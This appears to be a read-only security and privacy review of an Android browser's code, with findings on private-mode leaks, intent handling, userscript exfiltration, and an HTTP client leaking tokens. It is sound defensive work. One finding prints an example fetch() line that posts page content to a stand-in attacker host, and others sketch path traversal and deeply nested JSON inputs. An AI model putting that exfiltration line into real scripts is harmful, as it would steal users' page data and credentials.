# NOVA Browser v2.0 — W6 Security + Privacy Review: Phase 1 baseline + W1/W2/W3 (pure-logic files present in tree)

- Reviewer: W6 (read-only; no source file edited)
- Date: 2026-11-13 (overnight build)
- Baseline: v1.2 (versionCode 3). JVM tests re-run by reviewer: **121/121 pass** (AdBlockEngine 41, UrlUtils 72, CosmeticFilter 8) via `flock /tmp/nova-browser-build.lock bash tests/run-tests.sh`.
- Scope read: NOVA-BROWSER-PLAN.md §8, nova_android_build skill, Nebula design spec, and all of `app/src/main/java`, `AndroidManifest.xml`, `file_paths.xml`, `network_security_config.xml`, `assets/youtube-skipper.js`.

## Integration status (important — read first)

The tree already contains W1/W2/W3 **pure-Kotlin files dated 2026-11-12 16:15–16:16** (`data/TabGroup.kt`, `data/TabStore.kt`, `data/ExtensionStore.kt`, `data/HttpHistory.kt`, `extensions/Userscript.kt`, `extensions/ExtensionRuntime.kt`, `devtools/ConsoleLog.kt`, `devtools/NetworkLog.kt`, `devtools/CurlBuilder.kt`, `devtools/DevToolsHub.kt`, `devtools/ElementInspector.kt`, `devtools/JsonPretty.kt`, `devtools/HttpClientEngine.kt`) plus new tests (`tests/DevToolsTest.kt`, `tests/ExtensionsTest.kt`, `tests/TabGroupsTest.kt`) — **but none of it is wired in**: no caller of `TabStore`, `ExtensionStore`, `DevToolsHub`, `HttpClientEngine` or `HttpHistory` exists in `NovaClients.kt`, `BrowserState.kt`, `MainActivity.kt`, `PrivateActivity.kt` or any UI file; there is no `onConsoleMessage` hook, no `scriptsForUrl` injection hook, no Dev Mode toggle, no DevTools dock, no HTTP Client screen, no Extensions screen, and `assets/userscripts/cookie-banner-hider.js` does not exist. `tests/run-tests.sh` still compiles only the 3 old suites, so **the new code is currently untested by the runner**. Findings below on W1–W3 are therefore reviews of the delivered pure logic, not of a live feature; the injection/wiring hooks are still to come and must be re-reviewed when they land.

## Verdicts

- **Phase 1 (v1.2 baseline): CLEAR-WITH-FIXES** — no remote code execution, no credential storage, injection sites are clean. But 2 HIGH private-mode leaks (P-1, P-2) are ship-blockers for v2.0: private browsing currently leaves a persistent file on disk and writes private bookmarks into the shared DB.
- **W1 (tabs/groups/suspension, pure logic): CLEAR-WITH-FIXES** — logic is sound and incognito is refused at 3 layers; fix POST-data loss on restore (M-1) and note plaintext closed-tab URLs.
- **W2 (extensions/userscripts, pure logic): CLEAR-WITH-FIXES — DO NOT wire the injection hook until S-1 and S-2 are fixed.** A user script today runs on banking/login pages and can exfiltrate via page-context `fetch()`.
- **W3 (DevTools + HTTP Client, pure logic): CLEAR-WITH-FIXES** — Network log correctly stores no headers/bodies; but the HTTP Client re-sends `Authorization` across redirect hosts (H-1) and persists tokens in plaintext history (H-2). Both must be fixed before the HTTP Client screen ships.

---

## PHASE 1 — v1.2 baseline

### HIGH

**P-1 — Private-mode downloads persist as files on disk after the session ends**
- `data/Downloads.kt:60-88` (`enqueue`), `PrivateActivity.kt:155-176` (`onDestroy`)
- `enqueue()` always writes to public `Downloads/NOVA/Browser/` via DownloadManager, even when `recordToDb=false` (private mode). Only the DB row is kept in memory (`BrowserHost.kt:83-92`, `BrowserState.kt:privateDownloads`); the **file itself stays on shared storage**, visible in NOVA Files / any file manager, and the system DownloadManager record stays too. `PrivateActivity.onDestroy` wipes the WebView dir, private prefs and private error log — but never deletes private download files.
- Fix: in `PrivateActivity.onDestroy` (and on private-session close), delete the files for `state.privateDownloads` (same `File(Downloads/NOVA/Browser/, fileName)` construction as `Downloads.remove`) and `dm.remove(dmId)` each; or download private files to the private app cache dir instead of public Downloads. Also suppress the DownloadManager completion notification content for private downloads if possible.

**P-2 — Bookmarking from a private tab writes the URL into the shared (normal) bookmarks DB**
- `ui/BrowserScreen.kt:297-316` (star button, no `privateMode` guard), `ui/BrowserState.kt:261-270` (`toggleBookmark` → `db.addBookmark`), `data/BrowserDb.kt` (single shared `nova_browser.db` for both processes)
- The bookmark star is live in private mode and `toggleBookmark` has no incognito check, so a page bookmarked privately persists in normal bookmarks (and its URL/title in the shared DB) after the session is wiped. Same shape: `HomeScreen.kt:53-56` and `BookmarksScreen.kt:49-50` **read** normal pinned bookmarks / top sites / full history inside a private session (lower severity — same user — but a private session should show nothing of normal browsing).
- Fix: disable/hide the bookmark star and the Bookmarks/History menu entries when `state.privateMode`, and add a guard at the top of `BrowserState.toggleBookmark` (`if (privateMode) return false`). Make `HomeScreen` show no top-sites/bookmarks in private mode.

### MEDIUM

**M-1 — `intent://` URLs can launch arbitrary exported app components with no user gesture and no validation**
- `web/NovaClients.kt:127-148` (`parseIntentUrl`), `web/BrowserHost.kt:239-249` (`openExternal`)
- `shouldOverrideUrlLoading` fires on navigation (including iframes). `parseIntentUrl` returns any parsed intent that has a `package` set — any action, component and extras the page crafted — and `openExternal` starts it, catching only `ActivityNotFoundException`. An intent with e.g. `action=android.intent.action.CALL` would throw `SecurityException` (app holds no `CALL_PHONE`) and crash the browser, since it is uncaught.
- Fix: in `openExternal`, catch `SecurityException` (and `Exception`) and return false; in `parseIntentUrl`, allow only `Intent.ACTION_VIEW` (plus the existing `browser_fallback_url` path) and drop intents with an explicit `component` outside a browser fallback; ideally require a user gesture / confirmation for `intent://` launches.

**M-2 — DownloadManager may re-send the page's session cookie to a redirect host**
- `data/Downloads.kt:86-90` (`request.addRequestHeader("Cookie", cookie)`), `web/BrowserHost.kt:80-84` (cookie from `CookieManager.getInstance().getCookie(url)`)
- The cookie header is attached to the DownloadManager request, which follows redirects itself. If the download URL 302s cross-host, the session cookie goes to the redirect target. (Platform behaviour needs one on-device confirmation; the code has no redirect control — DownloadManager offers none.)
- Fix: only attach the cookie when the download is needed for an authenticated host AND warn in UI; the robust fix is the W4 custom downloader with manual redirect handling that drops `Cookie`/`Authorization` on cross-origin redirects (same rule as H-1).

**M-3 — Download filename is never sanitized by app code; `remove()`/`share()` build `File` paths from the stored name**
- `data/Downloads.kt:60` (`URLUtil.guessFileName`), `:140-148` (`remove`), `:191-208` (`share`)
- All path safety rests on undocumented `URLUtil.guessFileName` / DownloadManager behaviour for a crafted `Content-Disposition: filename="../../..."`. If a traversal name ever reaches the DB row, `remove()` deletes outside `Downloads/NOVA/Browser/` and `share()` can expose other files under `Download/` via the FileProvider.
- Fix: sanitize once in `enqueue` (strip `/`, `\`, `..`, leading dots, control chars; fall back to `download` + extension), store only the sanitized name, and in `remove()`/`share()` verify `file.canonicalPath.startsWith(downloadsDir.canonicalPath)`.

**M-4 — `intent://`/external-scheme handling aside, `MIXED_CONTENT_COMPATIBILITY_MODE` contradicts plan §8 "mixed content block"**
- `web/NovaClients.kt:47` (`s.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE`)
- Compatibility mode still allows mixed images/audio/video over http on https pages (active mixed content is blocked). A passive mixed-content image can leak the page URL (incl. query tokens) over cleartext.
- Fix: `MIXED_CONTENT_NEVER_ALLOW` (accept that a few legacy pages lose images), or keep compatibility mode only behind a per-site toggle and say so in the UI.

**M-5 — `network_security_config.xml`: cleartext permitted globally; HTTPS-only is app-level only**
- `res/xml/network_security_config.xml:6` (`<base-config cleartextTrafficPermitted="true">`)
- The app upgrades navigations itself (`NovaClients.kt:104-115`, `BrowserState.kt:218-228`), but sub-resource http loads and any future `loadUrl` path bypass the app check and are allowed by the system config. The plan's localhost/LAN exception is the only legitimate cleartext case.
- Fix: default `cleartextTrafficPermitted="false"` and add a `<domain-config>` permitting cleartext only for `localhost`, `127.0.0.1`, `10/8`, `172.16/12`, `192.168/16`, `.local`, `.lan`.

**M-6 — Permission requests for non-camera/mic resources are granted silently (incl. Protected Media ID)**
- `web/BrowserHost.kt:126-138` (`onPermissionRequest`: `androidPerms.isEmpty()` → `request.grant(request.resources)`)
- `RESOURCE_PROTECTED_MEDIA_ID` is a persistent per-origin identifier (fingerprinting/tracking surface) and is granted with no user prompt and no per-site record.
- Fix: prompt the user (same dialog pattern as geolocation) for any non-empty resource set the app does not map to an Android permission, or deny `RESOURCE_PROTECTED_MEDIA_ID` by default.

**M-7 — Private error log survives a killed private session; process-name check can fall through to the normal log**
- `data/ErrorLog.kt:27-33` (`file()` picks `error-log-private.txt` only when `Application.getProcessName()` ends with `:incognito`), `PrivateActivity.kt:155-176` (deletes it only in `onDestroy` when `isFinishing`)
- If the `:incognito` process is killed (swipe/OOM), `onDestroy` never runs and the private log (entries can contain URLs — see `NovaClients.kt:272`, `BrowserState.kt:235`) persists on disk until some later clean private close. If `getProcessName()` ever returns null, private errors land in the shared `error-log.txt`.
- Fix: delete `error-log-private.txt` at the start of `PrivateActivity.onCreate` when no live session exists (same pattern as the `app_webview_incognito` wipe there), and fall back to the private file (not the normal file) when the process name is unknown.

### LOW

**L-1 — `file_paths.xml` exposes the whole cache dir via FileProvider; currently unused, latent over-broad**
- `res/xml/file_paths.xml:4` (`<cache-path name="cache" path="." />`)
- Only `Downloads.share()` uses the provider today, and only for download files; the cache path grants nothing today. Any future code passing a cache file would share it. No private-mode/error-log/extension file is reachable through this provider (good — no `files-path` entry).
- Fix: remove the `<cache-path>` line unless a caller needs it; if needed, scope `path` to a dedicated subdir.

**L-2 — Error log records full URLs (query strings can carry tokens/reset links) in plaintext**
- `data/ErrorLog.kt:36-51`, callers e.g. `web/NovaClients.kt:272`, `data/Downloads.kt:91`
- File is app-private (`filesDir`, `allowBackup=false`) and the screen is in-app only, so exposure needs device access or a screenshot — but the entries are shown verbatim in `ErrorLogScreen`.
- Fix: strip query strings (or redact `token|auth|key|password|code` params) before logging URLs.

**L-3 — "Clear cookies / cache" only clears the current tab's WebView, not all tabs'**
- `ui/BrowserState.kt:335-346` (`clearBrowsingData`: `currentTab?.webView?.clearFormData()` / `clearCache(true)`)
- Other tabs keep cached files and form data after the user asked to clear them. (History part is correctly guarded for private mode — verified.)
- Fix: iterate all tabs' WebViews for `clearCache`/`clearFormData`, or document the limit in the Settings row.

**L-4 — Default User-Agent still exposes the phone model; plan §8 fingerprint option not implemented**
- `web/NovaClients.kt:78-88` (`applyDesktopMode` restores `WebSettings.getDefaultUserAgent`, which includes the device model)
- Plan §8 lists hiding the model as an optional setting; no such setting exists in `Settings.kt`. Not a vulnerability, a privacy gap vs the plan.
- Fix (future): optional "Hide device model from User-Agent" setting that strips the model token.

**L-5 — `file://` input is accepted by the address bar but can never load (`allowFileAccess=false`)**
- `web/UrlUtils.kt:29-33` (`resolveInput` passes `file://` through), `web/NovaClients.kt:51`
- Harmless (fails closed) but inconsistent: local HTML preview (plan §6.5) is not implemented yet, so typing `file:///...` just errors. Keep `allowFileAccess=false` until local preview ships with a scoped implementation.

### Verified OK (Phase 1)

- **Script injection scope:** only 2 `evaluateJavascript` call sites, both bundled-asset/static strings — `NovaClients.kt:221` cosmetic filter (selectors escaped for `\` and `'` in `CosmeticFilter.kt:12-16`; selectors come from line-split filter rules so no embedded newline can break out of the string) and `:254` YouTube skipper (`YoutubeSkipper.kt`, static asset). **No URL, title or user string is ever concatenated into evaluated JS.** No `addJavascriptInterface` anywhere — no native bridge exists.
- **YouTube skipper:** runs only on YouTube hosts (`UrlUtils.isYouTubeHost`, dot-boundary suffix match — `youtube.com.evil.com` correctly rejected), idempotent guard, fail-open, no network calls, no exfiltration. It clicks/dismisses page UI and seeks video — page-privileged by design.
- **Credentials/tokens:** none stored. Grep for `password|token|secret|credential|api[_-]?key|client_secret|EncryptedShared` finds only comments and the word "token" in a code comment. No password-save feature exists yet (plan P1) — when it lands it must use EncryptedSharedPreferences per plan §8.
- **Suggestions / pre-submit network:** verified — address bar `onValueChange` (`BrowserScreen.kt:263-266`) only updates local text; nothing is sent until Go/submit (`loadInput` → `UrlUtils.resolveInput`, query URL-encoded via `URLEncoder`).
- **SSL:** never auto-proceeds; handler held on tab, cleared in `onPageStarted`, dialog forces a user decision; Back cancels (`BrowserScreen.kt:132-141, 645+`). Safe Browsing enabled (`NovaClients.kt:57`).
- **Popups:** `onCreateWindow` requires a user gesture (`NovaClients.kt:308-320`).
- **DB/SQL:** all queries parameterized; `searchHistory` escapes LIKE wildcards (`BrowserDb.kt:124-135`). History/bookmarks/tabs stored plaintext in app-private DB — standard for a browser, no encryption at rest (honest limit, same as stock browsers without extra hardening; `allowBackup=false` in manifest).
- **Incognito isolation — what holds:** separate `:incognito` process + `setDataDirectorySuffix("incognito")` (`PrivateActivity.kt:48-51`, singleTask guard), `LOAD_NO_CACHE`, history never recorded (`NovaClients.kt:211`), tabs never saved (`BrowserState.kt:290-292`), per-site prefs in a separate file wiped on close (`Settings.kt`, `PrivateActivity.kt:167-171`), private error log separate, "Clear history" hidden/guarded in private mode (`SettingsScreen.kt:220-226`, `BrowserState.kt:334`). Private downloads never enter the shared DB list (`DownloadsScreen.kt:51-52, 114-128`).
- **Downloads open:** uses `DownloadManager.getUriForDownloadedFile` + `ACTION_VIEW` — standard; mime comes from the server-supplied value (see L-note in report: mismatch can open a file in the wrong handler; low).

### Honest limits (Phase 1 — design cannot protect against these)

- Injected scripts (cosmetic filter, skipper) run with **full page privileges** — they can read anything the page can, including password fields on YouTube. That is inherent to content scripts; the mitigation is scope (host gating) + bundled-only sources, both present.
- WebView version is the system's; an old System WebView means an old Chromium with known bugs (plan §14.1). No in-app mitigation exists yet (no WebView version check/warning).
- `allowBackup=false` protects backups, but history/bookmarks/cookies are plaintext in app-private storage — a rooted device or unlocked-phone forensic read can recover them. No at-rest encryption is implemented.
- Ad-block lists are bundled only (no network update yet) — good for privacy, but lists go stale.

---

## W1 — Tabs / groups / suspension / recently-closed (pure logic only, NOT wired)

**W1-1 (MEDIUM) — Suspended tab restore is a plain GET: POST data is lost, and a background tab mid-form/upload is destroyed without warning**
- `data/TabStore.kt:130-158` (`TabSuspension.suspendTab`: `webView.destroy()`, `initialUrlLoaded=false`), `data/Tab.kt:43-49` (restore reloads `tab.url` via `BrowserState.ensureWebView`)
- Restore re-loads `tab.url` as a fresh GET. A tab showing a POST result (form submit, checkout, payment) comes back as a GET — error page at best, double-submit at worst if the site replays. `TabSuspensionPolicy.shouldSuspend` (`data/TabGroup.kt:168-196`) suspends on memory pressure (`trimLevel >= RUNNING_LOW`) even for a recently-used background tab, including one with an in-flight upload.
- Fix: never suspend a tab whose `webView` history has a POST entry if that can be detected (`WebBackForwardList` has no POST flag — so the honest fix is: only auto-suspend tabs whose current URL was reached by GET, or keep a `wasPost` flag set in `onPageStarted`/`loadUrl` and exempt it); and exempt tabs with an active download/upload. Document the GET-only restore limit in the tab switcher.

**W1-2 (LOW) — Recently-closed tabs + group membership persist URLs in plaintext SharedPreferences**
- `data/TabStore.kt:17-19, 62-84` (`nova_browser_tab_store`, `TabStoreCodec` line format), `data/TabGroup.kt:232+`
- URLs can carry sensitive query params (password-reset links, search queries, session tokens). App-private prefs, same exposure class as history — acceptable, but note it; do not put this file in any future backup/export.
- Fix: none required for v2.0; optionally strip query strings for closed-tab/group-member URLs (breaks some restores — weigh it, don't silently do it).

**W1-3 (process) — New tests exist but are not run**
- `tests/TabGroupsTest.kt` (165 lines), `tests/ExtensionsTest.kt`, `tests/DevToolsTest.kt` exist, but `tests/run-tests.sh` compiles only the 3 old suites. The W1 pure logic (`TabStoreCodec` escaping, `RecentlyClosedStack` incognito refusal, `TabSuspensionPolicy`) is currently untested by the runner.
- Fix: add the three new test files + new source files to `run-tests.sh` (coordinator/build owner, not W6 — I did not edit it).

**Verified OK (W1):** incognito refused at three layers (`RecentlyClosedStack.push` `TabGroup.kt:241-246`, `TabStore.pushClosed` `:86-89`, `loadClosed` filter `:70-75`); suspension policy never touches the current tab or incognito tabs (`TabGroup.kt:181-186`); `TabStoreCodec` escaping/splitting is correct (backslash escapes honoured on split, malformed lines skipped, `decodeGroups` guards field counts); group re-linking by URL is exact-match only; `TabSearch.matchesTab` is local-only; `Tab.touch()` clears `discarded`. **Not wired:** no `onTrimMemory` hook in `MainActivity.kt`, no `pushClosed` call in `BrowserState.closeTab`, no `lastUsedMs` update in `BrowserState.selectTab`, no `Settings.suspendBackgroundTabs` flag referenced by `TabSuspension` (`TabStore.kt:144` cites hooks HOOK-B/C/E that do not exist in `BrowserState.kt`). Re-review at wiring time.

### Honest limits (W1)

- URL-based group re-linking breaks when a tab's URL changes between sessions (documented in `TabStore.kt:10-16`); a tab restored with a different URL silently leaves its group.
- Suspension is not a privacy wipe: cookies/storage survive `destroy()` by design — a suspended tab's login persists.

---

## W2 — Extensions / userscripts (pure logic only, NOT wired)

**S-1 (HIGH) — No sensitive-site protection: scripts run on banking/login pages by default, contrary to plan §8**
- `extensions/ExtensionRuntime.kt:108-146` (`scriptsForUrl`/`scriptsForRunAt` — only checks `enabled`, `runAt`, `@match`, per-site off list), `extensions/Userscript.kt` (no sensitive-host concept anywhere)
- Plan §8: "পারমিশন ছাড়া পাসওয়ার্ড/ব্যাংক সাইটের DOM পড়তে পারবে না — সেনসিটিভ সাইটে কনটেন্ট স্ক্রিপ্ট ডিফল্ট বন্ধ।" Nothing enforces it. A user script with `@match *://*/*` runs on any bank/login page the user visits, with full DOM access. Per-site off is opt-out — the user must know to disable it per bank.
- Fix: add a default-off sensitive-host rule in `scriptsForUrl` — at minimum a curated blocklist (common bank/payment/identity hosts is unmaintainable; the honest, maintainable rule is: **user scripts (non-built-in) never run on a page containing a password field unless the user explicitly enabled that script for that host** — detectable at injection time via a tiny `document.querySelector('input[type=password]')` pre-check, or a conservative host-pattern list). Built-ins (skipper/cookie-hider) are host-scoped already. Document the chosen rule; do not ship the hook with match-only gating.

**S-2 (HIGH) — The "no network API" claim is false in practice: an injected script can exfiltrate via page-context `fetch()`/`XHR`**
- `extensions/Userscript.kt:9-14` ("It has NO network API, NO JS bridge"), `extensions/ExtensionRuntime.kt:28-30` (same claim)
- True at the native level (no bridge), but any script injected via `evaluateJavascript` runs as the page and can `fetch('https://attacker.example', {method:'POST', body: document.body.innerHTML})` or read `document.cookie` (non-HttpOnly), password fields and `localStorage`, then send them anywhere the page can reach. Combined with S-1 this is a credential-theft primitive for any malicious/buggy userscript.
- Fix: correct the doc claims in both files (say "no *native* bridge; scripts inherit the page's network capability, so @match scope + sensitive-site gating is the only boundary"), and treat script install as a trust decision: the install UI must show the full @match scope and warn that the script can read page content including passwords before the user confirms.

**S-3 (MEDIUM) — `fetchScriptText` follows redirects with no scheme/content-type check: an http downgrade can serve a MITM'd script**
- `extensions/ExtensionRuntime.kt:202-242` (`instanceFollowRedirects = true`, accepts any 2xx, any content-type, no check on final URL)
- A `https://` install URL that 302s to `http://` (or to an attacker host) yields a script the user did not review. Size cap (+1 byte) and 30 s timeout are correct.
- Fix: disable auto-redirects and handle them manually (max 5, same as `HttpClientEngine`), refuse http downgrade (final URL must be https unless the original URL was http and the user confirmed), and reject non-`text/*`/`application/javascript` content-types.

**S-4 (MEDIUM) — Cookie Banner Hider falls back to `@match *://*/*` when its header is unparseable; asset is missing**
- `extensions/ExtensionRuntime.kt:162-185` (`matches = meta?.matches ?: listOf("*://*/*")`), `assets/` has no `userscripts/cookie-banner-hider.js`
- If the asset ships with a bad header, the built-in runs on **every** http(s) site including banking pages (compounds S-1). Today the asset is absent so `builtInScripts` silently skips it — if the Extensions UI lists it as available, that is a false claim.
- Fix: fail closed — skip a built-in whose header does not parse (never default to match-all); ship the asset or remove the listing.

**S-5 (MEDIUM, defense-in-depth) — `ExtensionStore` has no private-mode guard; it trusts the caller never to call it from `:incognito`**
- `data/ExtensionStore.kt:22-31` (doc claims the Extensions screen is normal-only and the hook "does not route to it from PrivateActivity"; `filesDir` is shared between processes)
- If the future injection hook ever calls `loadEffectiveScripts` from the private process, per-site disabled hosts (which reveal visited hosts) are read from the shared store, and any write path would persist private choices. Nothing in the store enforces the boundary.
- Fix: refuse (return built-ins-only / empty) when `Application.getProcessName()` ends with `:incognito`, and never call the store from `PrivateActivity`'s injection hook; private tabs should get built-ins only (or no scripts at all — coordinator decision).

**S-6 (LOW) — `loadInstalled` trusts the `id` from JSON when building the script file path**
- `data/ExtensionStore.kt:44-49` (`File(scriptsDir(context), "$id.js")` with `id` from `extensions.json`)
- Only the app writes that JSON, so exploitation needs root/tampered storage — but a `../` id would read outside the scripts dir.
- Fix: validate `id` against `^[a-z0-9-]+$` (the `slugify` output alphabet) on load, skip otherwise.

**Verified OK (W2):** `@match` glob enforcement is careful and fail-closed (no `@match` = runs nowhere; `*` scheme covers http/https only, never file/ftp/about; `*.example.com` never matches bare `example.com`; host compare case-insensitive, path case-sensitive — `Userscript.kt:88-176`); header parser rejects missing header/unclosed block/no-`@name`/no-`@match`; 200 KB size cap enforced at install and at fetch; duplicate-id install refused (no silent overwrite); built-in ids cannot be shadowed (`ExtensionRuntime.kt:174-180`); `writeIndex` is tmp+rename; install is off-main-thread by contract (caller must honour it — no caller yet). Note: `YOUTUBE_MATCHES` (`ExtensionRuntime.kt:44-49`) omits bare `youtube.com` (only `*.youtube.com`) — functional nit, not security: bare-host navigation would skip the skipper; the old `isYouTubeHost` path covers it.

### Honest limits (W2)

- There is no true `document-start` hook in WebView — both run-at groups inject at `onPageFinished`/`doUpdateVisitedHistory` (honestly documented in `ExtensionRuntime.kt:31-35`). A page can read/modify its DOM before any script runs; scripts cannot reliably block first-paint content.
- No code signing/verification for installed scripts (plan §9 mentions signature checks for `.novaext` — not implemented). Install is a pure user-trust decision; a script the user pastes/fetches is arbitrary page-privileged code.
- `@grant`/`@require`/remote code are ignored by the parser (good), but nothing stops a script's own source from `fetch()`ing and `eval()`ing remote code at runtime — page-context `eval` is available to injected scripts.

---

## W3 — DevTools + HTTP Client (pure logic only, NOT wired)

**H-1 (HIGH) — HTTP Client re-sends `Authorization`/`Cookie` headers to redirect targets, including cross-host and https→http**
- `devtools/HttpClientEngine.kt:121-165` (manual redirect loop; every hop re-applies the same `request.headers` via `setRequestProperty`)
- A request to `https://api.example.com` with `Authorization: Bearer …` that 302s to `https://evil.example` (or downgrades to `http://`) sends the bearer token to the new host. The 303/301/302→GET body-drop logic is correct, but headers are not scrubbed.
- Fix: on each redirect, compare origin (scheme+host+port) of `currentUrl` vs the `Location` target; when it differs, drop `Authorization`, `Cookie` and `Proxy-Authorization` before the next hop (browser/fetch behaviour). Also refuse https→http redirects carrying auth unless the user confirms.

**H-2 (HIGH) — HTTP history persists `Authorization`/`Cookie` headers (and bodies) in plaintext SQLite**
- `data/HttpHistory.kt:60-92` (`addHistory` stores `HttpHeaderCodec.encode(request.headers)` + `body` verbatim, last 50, auto-pruned), `devtools/HttpClientEngine.kt:55-66` (`HttpHeaderCodec` — no redaction)
- Every sent request's bearer/basic tokens and cookies land in `http_history.db` (and any named saved request in `http_saved`) in plaintext, readable by anything with device/app-data access, and shown again by "replay from history". The brief asked exactly this — answer: **yes, history persists tokens today**.
- Fix: redact `Authorization`, `Cookie`, `Proxy-Authorization` (and `Set-Cookie` on responses, if response persistence is added) before `addHistory`/`saveRequest` — store a marker like `<redacted>` or drop the header; warn in the UI that history stores what was sent. Alternatively do not persist headers at all without an explicit per-request opt-in.

**W3-1 (MEDIUM) — `JsonPretty` recursive parser can `StackOverflowError` on a hostile deeply-nested JSON response, and `parse()` only catches `Exception`**
- `devtools/JsonPretty.kt:31-38` (`parse` catches `Exception`; `StackOverflowError` is an `Error`), recursive-descent `Parser`
- The HTTP Client pretty-prints server-controlled bodies. A malicious server returning `[[[[…` 10k deep crashes the app when the response viewer parses it.
- Fix: catch `Throwable` in `parse()`/`pretty()` (or add a max nesting depth, e.g. 100, to the parser) and fall back to showing the raw body.

**W3-2 (MEDIUM) — Network log stores full URLs (query strings included); Copy-as-cURL copies them to the clipboard**
- `devtools/NetworkLog.kt:60-108` (stores `url` verbatim), `devtools/CurlBuilder.kt:14-34` (quotes but never redacts)
- Password-reset links, `?token=…`, `?session=…` URLs are logged (in-memory, 200-entry ring) and one tap copies them to the clipboard, where any app can read them. No request headers/bodies/cookies are stored — that part is correct and matches the brief.
- Fix: redact sensitive query params (`token|auth|key|password|code|session|secret`) in `NetworkLog.record` (store `url` redacted, keep a flag), and in `CurlBuilder.build` redact `Authorization`/`Cookie` header values (or warn before copying when they are present).

**W3-3 (MEDIUM, integration) — `setWebContentsDebuggingEnabled(false)` is hard-coded in every WebView setup; the Dev Mode toggle has nowhere to hook**
- `web/NovaClients.kt:60-61` (`WebView.setWebContentsDebuggingEnabled(false)` inside `NovaWebView.configure`, called for every new tab)
- Correct default (off), but if W3 enables debugging when Dev Mode turns on, the next tab creation re-disables it globally. Ordering matters and is currently unspecified.
- Fix: make `configure()` take a `debuggingEnabled` parameter sourced from Dev Mode state (Dev Mode off → false, on → user-consented true), and re-apply it whenever the toggle changes; never enable it outside Dev Mode, and show the consent warning the plan requires (§3, §8).

**W3-4 (LOW) — Console/Network logs are process-wide singletons: every tab's data mixes, and nothing auto-clears them**
- `devtools/DevToolsHub.kt:22-32` (one `console` + `network` per process, "deliberately NOT per-tab"; cleared only by the dock Clear button)
- Console messages can contain page secrets (`console.log(token)`); the dock would show another tab's messages. In-memory only (200 cap) and the `:incognito` process has its own instance (good — no cross-mode leak), but within normal mode the mixing is real.
- Fix: scope stores per tab (or clear on tab switch / when the dock opens for a different tab); at minimum clear both on Dev Mode exit.

**W3-5 (LOW) — Storage viewer dumps full `localStorage`/`sessionStorage` (incl. auth tokens) into the UI; REPL output has no persistence rule yet**
- `devtools/ElementInspector.kt:102-116` (`LOCAL_STORAGE_DUMP_JS` / `SESSION_STORAGE_DUMP_JS` return whole storage as JSON)
- User-initiated, in-memory, page-scoped — acceptable for a dev tool — but values that look like tokens should be masked in the viewer, and the (not yet wired) REPL must never write its output into `ErrorLog` or any file.
- Fix: mask values matching token-like patterns in the Storage panel; keep REPL I/O in memory only.

**W3-6 (LOW) — No request-body size cap in the HTTP Client (response is capped at 1 MB, request is not)**
- `devtools/HttpClientEngine.kt:32-33` (`MAX_BODY_BYTES` covers responses only); `execute` writes the whole body in one `outputStream.write(body.toByteArray())`
- A huge pasted/saved body is held as a String and written at once. User-directed, low likelihood — but a saved request with a multi-MB body re-sent repeatedly is a cheap OOM.
- Fix: cap request bodies (e.g. 10 MB) in `HttpRequestData.validate()` and stream the write in chunks.

**Verified OK (W3):** Network log records URL/method/blocked/kind/timestamp only — no headers, bodies or cookies (brief requirement met); `CurlBuilder.sq` shell-quotes correctly (`'` → `'\''`); `HttpClientEngine` timeouts (30 s), manual redirects (max 5), 303→GET + body drop, 1 MB response cap with `truncated` flag, `validate()` rejects non-http(s) URLs and bad header names; `ConsoleStore` is synchronized and capped at 200; `ElementInspector` uses no `JavascriptInterface`, install is idempotent, and `removeLocalItemJs` escapes keys via `JsonPretty.escapeJsonString` (quotes/backslash/control chars); `HttpHistory` uses its own DB file (`http_history.db`) so it can never corrupt browsing data. **Not wired:** no `onConsoleMessage` hook in `NovaClients.kt`, no `shouldInterceptRequest` recording call, no dock UI, no Dev Mode gate, no HTTP Client screen — re-review at wiring time, especially: REPL must be Dev-Mode-only, and the inspector's `window.__novaInspected` payload is page-readable/spoofable (a hostile page can pre-seed it — dev-tool integrity note, low).

### Honest limits (W3)

- `shouldInterceptRequest` cannot see response status/size/timing or distinguish XHR from sub-resource fetches — the Network panel must not claim otherwise (the code's doc comment says this honestly; the UI must carry the same caveat).
- The HTTP Client is a user-directed tool: it can hit `localhost`/LAN hosts and internal services by design (no SSRF guard is appropriate here — the user is the requester). It must not be exposed to web content: never let a page trigger it.
- `WebContentsDebuggingEnabled` exposes the page to any local debugger via USB (`chrome://inspect`); it must stay off unless Dev Mode + explicit consent.

---

## What still needs a review pass (not in this report)

- W4 (Reader, suggestions, custom downloader, per-site settings, clear-on-exit) — no W4 files exist in the tree yet.
- All wiring/hooks the coordinator adds for W1–W3 (injection hook in `NovaClients.kt`, Dev Mode gating, dock screens, HTTP Client screen, Extensions screen, `onTrimMemory` hook, `run-tests.sh` update).
- On-phone verification of the platform-dependent items (M-2 DownloadManager redirect headers, M-3 `guessFileName` sanitization) — code review alone cannot settle them.
